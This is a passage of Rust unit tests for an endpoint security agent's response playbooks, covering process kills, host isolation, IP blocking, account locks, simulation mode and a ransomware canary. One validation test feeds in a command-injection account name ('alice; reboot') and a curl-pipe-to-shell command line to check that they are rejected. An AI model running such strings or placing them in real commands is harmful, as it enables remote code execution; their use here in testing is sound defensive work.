                change_type: "modified".to_string(),
            }],
            ..Default::default()
        };

        let result = eval(&pb, &ctx).await;
        assert!(
            result.triggered,
            "an AND playbook with all conditions matched must still trigger"
        );
    }

    #[test]
    fn isolation_duration_reads_seconds_and_defaults_to_one_hour() {
        assert_eq!(isolation_duration("900"), 900);
        assert_eq!(isolation_duration(" 0 "), 0, "0: until released");
        assert_eq!(isolation_duration(""), DEFAULT_ISOLATION_SECS);
        assert_eq!(isolation_duration("one hour"), DEFAULT_ISOLATION_SECS);
        assert_eq!(isolation_duration("-5"), DEFAULT_ISOLATION_SECS);
    }

    #[tokio::test]
    async fn encrypted_canary_resolves_to_isolation_and_nothing_else() {
        let mut pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::FimChange,
            operator: "any".into(),
            value: crate::ransomware_canary::PLAYBOOK_CHANGE_TYPE.into(),
        }]);
        pb.actions.push(agent_gui::dto::PlaybookAction {
            action_type: agent_gui::dto::PlaybookActionType::IsolateHost,
            parameters: "1800".into(),
        });
        let canary = ThreatContext {
            fim_alerts: vec![FimAlertInfo {
                path: "/Users/alice/Documents/.0-archives-1a2b3c".to_string(),
                change_type: crate::ransomware_canary::PLAYBOOK_CHANGE_TYPE.to_string(),
            }],
            ..Default::default()
        };

        let result = eval(&pb, &canary).await;
        assert!(result.triggered);
        // The decoy folder is a candidate for quarantine, but the playbook
        // only authorizes the isolation.
        assert_eq!(result.actions.len(), 1);
        assert!(matches!(
            result.actions[0],
            ResolvedAction::IsolateHost {
                duration_secs: 1800
            }
        ));
        assert!(is_destructive(&result.actions[0]));

        // An ordinary file change does not isolate the endpoint.
        let ordinary = ThreatContext {
            fim_alerts: vec![FimAlertInfo {
                path: "/etc/hosts".to_string(),
                change_type: "modified".to_string(),
            }],
            ..Default::default()
        };
        let result = eval(&pb, &ordinary).await;
        assert!(!result.triggered && result.actions.is_empty());
    }

    #[tokio::test]
    async fn console_notification_playbook_never_resolves_destructive_actions() {
        let mut pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::ProcessNameMatch,
            operator: "any".into(),
            value: "evil".into(),
        }]);
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("evil", 1234)],
            ..Default::default()
        };
        assert!(eval(&pb, &ctx).await.actions.is_empty());
        pb.actions.push(agent_gui::dto::PlaybookAction {
            action_type: agent_gui::dto::PlaybookActionType::CreateNotification,
            parameters: "Investigate".into(),
        });
        let result = eval(&pb, &ctx).await;
        assert!(result.triggered);
        assert_eq!(result.actions.len(), 1);
        assert!(
            matches!(&result.actions[0], ResolvedAction::Notify { message } if message == "Investigate")
        );
    }

    #[tokio::test]
    async fn matching_process_name_kills_only_the_match() {
        let mut pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::ProcessNameMatch,
            operator: "any".to_string(),
            value: "evil".to_string(),
        }]);
        pb.actions.push(agent_gui::dto::PlaybookAction {
            action_type: agent_gui::dto::PlaybookActionType::KillProcess,
            parameters: String::new(),
        });
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("evil_miner", 1234), proc("chrome", 5678)],
            ..Default::default()
        };
        let result = eval(&pb, &ctx).await;
        assert!(result.triggered);
        assert!(
            result
                .actions
                .iter()
                .any(|a| matches!(a, ResolvedAction::KillProcess { pid: 1234, .. })),
            "matching process must be killed"
        );
        assert!(
            !result
                .actions
                .iter()
                .any(|a| matches!(a, ResolvedAction::KillProcess { pid: 5678, .. })),
            "non-matching process must be spared"
        );
    }

    // ── simulation ──────────────────────────────────────────────────────

    #[tokio::test]
    async fn simulation_labels_every_action_and_delivers_none() {
        // Absolute on the system the tests run on: a relative target is
        // refused, simulation or not.
        let dropped = if cfg!(windows) {
            r"C:\Temp\evil.bin"
        } else {
            "/tmp/evil.bin"
        };
        let actions = vec![
            ResolvedAction::KillProcess {
                name: "evil_miner".into(),
                pid: 4242,
            },
            ResolvedAction::QuarantineFile {
                path: dropped.into(),
            },
            ResolvedAction::BlockIp {
                ip: "203.0.113.7".into(),
                duration_secs: 3600,
            },
            ResolvedAction::IsolateHost { duration_secs: 0 },
            ResolvedAction::Notify {
                message: "seen".into(),
            },
        ];
        let results = simulate_playbook_actions("sim", &actions, None).await;

        let quarantine = format!("[Simulation] Quarantine {dropped}");
        assert_eq!(
            results
                .iter()
                .map(|r| r.action.as_str())
                .collect::<Vec<_>>(),
            [
                "[Simulation] Kill process evil_miner (PID 4242)",
                quarantine.as_str(),
                "[Simulation] Block IP 203.0.113.7",
                "[Simulation] Isolate host until released",
                "[Simulation] Notify: seen",
            ]
        );
        // Would run: no destination or privilege is needed to say so.
        assert!(results.iter().all(|r| r.success && r.error.is_none()));
    }

    /// What a brute force that succeeded leaves the playbook with: the
    /// address it came from and the account it took.
    fn brute_force_context() -> ThreatContext {
        ThreatContext {
            suspicious_processes: vec![],
            network_alerts: vec![
                NetworkAlertInfo {
                    remote_ip: Some("203.0.113.9".to_string()),
                    port: None,
                    severity: "critical".to_string(),
                    description: "Sigma: Connexion SSH réussie après une attaque par force brute"
                        .to_string(),
                    user: Some("deploy".to_string()),
                },
                // The burst that came before names no account that was taken.
                NetworkAlertInfo {
                    remote_ip: Some("203.0.113.9".to_string()),
                    port: None,
                    severity: "high".to_string(),
                    description: "Sigma: Attaque par force brute SSH".to_string(),
                    user: None,
                },
            ],
            fim_alerts: vec![],
        }
    }

    fn on_critical_network_alert(actions: &[(PlaybookActionType, &str)]) -> Playbook {
        let mut playbook = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::NetworkAlertType,
            operator: "any".to_string(),
            value: "critical".to_string(),
        }]);
        playbook.actions = actions
            .iter()
            .map(|(action_type, parameters)| PlaybookAction {
                action_type: *action_type,
                parameters: (*parameters).to_string(),
            })
            .collect();
        playbook
    }

    #[tokio::test]
    async fn the_account_an_alert_names_is_locked_only_when_the_playbook_says_so() {
        let context = brute_force_context();

        let lock = on_critical_network_alert(&[
            (PlaybookActionType::BlockIp, ""),
            (PlaybookActionType::DisableAccount, "900"),
        ]);
        let evaluation = eval(&lock, &context).await;
        let described: Vec<String> = evaluation.actions.iter().map(describe).collect();
        assert_eq!(
            described,
            ["Block IP 203.0.113.9", "Lock account deploy for 900s"]
        );

        // The same alert, a playbook that only blocks: no account is touched.
        let block_only = on_critical_network_alert(&[(PlaybookActionType::BlockIp, "")]);
        let evaluation = eval(&block_only, &context).await;
        assert!(
            evaluation
                .actions
                .iter()
                .all(|action| !matches!(action, ResolvedAction::DisableAccount { .. }))
        );

        // No duration given: an hour. Zero: until an administrator unlocks.
        for (parameter, expected) in [("", "for 3600s"), ("0", "until unlocked")] {
            let playbook =
                on_critical_network_alert(&[(PlaybookActionType::DisableAccount, parameter)]);
            let evaluation = eval(&playbook, &context).await;
            assert_eq!(evaluation.actions.len(), 1);
            assert!(describe(&evaluation.actions[0]).ends_with(expected));
        }
    }

    #[tokio::test]
    async fn a_response_command_is_given_what_the_playbook_matched() {
        let playbook = on_critical_network_alert(&[
            (PlaybookActionType::BlockIp, ""),
            (PlaybookActionType::DisableAccount, ""),
            (PlaybookActionType::RunCommand, " open-ticket "),
        ]);
        let evaluation = eval(&playbook, &brute_force_context()).await;
        let Some(ResolvedAction::RunCommand { name, context }) = evaluation.actions.last() else {
            panic!("the command comes last: {:?}", evaluation.actions);
        };
        assert_eq!(name, "open-ticket");
        assert_eq!(context["playbook"], "test");
        assert_eq!(context["targets"]["addresses"][0], "203.0.113.9");
        assert_eq!(context["targets"]["accounts"][0], "deploy");
        assert!(
            context["targets"]["processes"]
                .as_array()
                .unwrap()
                .is_empty()
        );
    }

    #[tokio::test]
    async fn what_cannot_be_an_account_or_a_command_name_never_runs() {
        let actions = vec![
            ResolvedAction::DisableAccount {
                user: "alice; reboot".into(),
                duration_secs: 60,
            },
            ResolvedAction::DisableAccount {
                user: "-L".into(),
                duration_secs: 60,
            },
            // A playbook names a command; it does not carry one.
            ResolvedAction::RunCommand {
                name: "/bin/sh -c 'curl evil | sh'".into(),
                context: serde_json::json!({}),
            },
        ];
        let results = execute_playbook_actions("test", &actions, None).await;
        assert_eq!(results.len(), 3);
        for result in &results {
            assert!(!result.success);
            assert!(
                result
                    .error
                    .as_deref()
                    .is_some_and(|e| e.contains("Rejected by target validation")),
                "{result:?}"
            );
        }

        // A well-formed name that the configuration does not declare.
        let undeclared = vec![ResolvedAction::RunCommand {
            name: "not-declared".into(),
            context: serde_json::json!({}),
        }];
        let results = execute_playbook_actions("test", &undeclared, None).await;
        assert!(!results[0].success);
        assert!(
            results[0]
                .error
                .as_deref()
                .is_some_and(|e| e.contains("no response command named"))
        );
    }

    #[tokio::test]
    async fn a_simulated_lock_or_command_is_described_and_not_run() {
        let actions = vec![
            ResolvedAction::DisableAccount {
                user: "deploy".into(),
                duration_secs: 0,
            },
            ResolvedAction::RunCommand {
                name: "open-ticket".into(),
                context: serde_json::json!({}),
            },
        ];
        let results = simulate_playbook_actions("sim", &actions, None).await;
        assert_eq!(
            results
                .iter()
                .map(|r| r.action.as_str())
                .collect::<Vec<_>>(),
            [
                "[Simulation] Lock account deploy until unlocked",
                "[Simulation] Run response command 'open-ticket'"
            ]
        );
        assert!(results.iter().all(|r| r.success));
    }

    #[tokio::test]
    async fn simulation_reports_what_a_real_run_would_refuse() {
        let mut actions = vec![ResolvedAction::KillProcess {
            name: "launchd".into(),
            pid: 1,
        }];
        actions.extend((0..12).map(|i| ResolvedAction::BlockIp {
            ip: format!("203.0.113.{i}"),
            duration_secs: 60,
        }));
        let results = simulate_playbook_actions("sim", &actions, None).await;

        assert!(!results[0].success, "PID 1 is refused in simulation too");
        let refused = results
            .iter()
            .filter(|r| {
                r.error
                    .as_deref()
                    .is_some_and(|e| e.contains("destructive-action limit"))
            })
            .count();
        assert_eq!(refused, 2, "the limit of a real run applies");
    }

    /// The property the mode exists for, on a real process: a simulated kill
    /// leaves it running, the same playbook armed terminates it.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_simulated_playbook_changes_nothing_on_the_host() {
        let mut child = std::process::Command::new("sleep")
            .arg("60")
            .spawn()
            .expect("spawn sleep");
        let mut pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::ProcessNameMatch,
            operator: "any".to_string(),
            value: "sleep".to_string(),
        }]);
        pb.actions.push(agent_gui::dto::PlaybookAction {
            action_type: agent_gui::dto::PlaybookActionType::KillProcess,
            parameters: String::new(),
        });
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("sleep", child.id())],
            ..Default::default()
        };
        let run = |simulate: bool| {
            let (pb, ctx) = (&pb, &ctx);
            async move {
                crate::threat_pipeline::run_threat_pipeline(
                    &[],
                    std::slice::from_ref(pb),
                    ctx,
                    &crate::threat_pipeline::ObservedActivity::default(),
                    &mut crate::threat_pipeline::RuleHitMemory::default(),
                    &None,
                    #[cfg(feature = "llm")]
                    None,
                    None,
                    None,
                    simulate,
                )
                .await
            }
        };

        let simulated = run(true).await;
        assert_eq!(simulated.playbook_logs.len(), 1);
        assert_eq!(
            simulated.playbook_logs[0].actions_executed,
            [format!(
                "[Simulation] Kill process sleep (PID {})",
                child.id()
            )]
        );
        assert!(
            child.try_wait().unwrap().is_none(),
            "a simulated kill must leave the process running"
        );

        let armed = run(false).await;
        assert_eq!(
            armed.playbook_logs[0].actions_executed,
            [format!("Kill process sleep (PID {})", child.id())]
        );
        assert!(
            armed.playbook_logs[0].success,
            "{:?}",
            armed.playbook_logs[0].error
        );
        assert!(!child.wait().unwrap().success(), "armed, it is terminated");
    }
}
